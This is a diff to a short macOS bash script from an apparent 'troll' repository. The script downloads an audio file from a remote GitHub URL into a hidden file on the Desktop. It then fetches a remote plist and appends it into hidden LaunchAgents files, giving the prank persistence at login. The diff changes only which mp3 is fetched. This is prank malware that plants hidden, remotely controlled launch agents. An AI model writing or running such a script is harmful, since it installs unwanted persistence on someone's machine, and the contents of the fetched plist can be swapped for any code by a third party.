@@ -1,5 +1,5 @@
 #! /bin/bash
-curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/HT.mp3 --output ~/Desktop/.troll.mp3
+curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/P.mp3 --output ~/Desktop/.troll.mp3
 
 curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/main.plist >> ~/Library/LaunchAgents/.main1.plist
 cat ~/Library/LaunchAgents/.main1.plist >> ~/Library/LaunchAgents/.music.plist
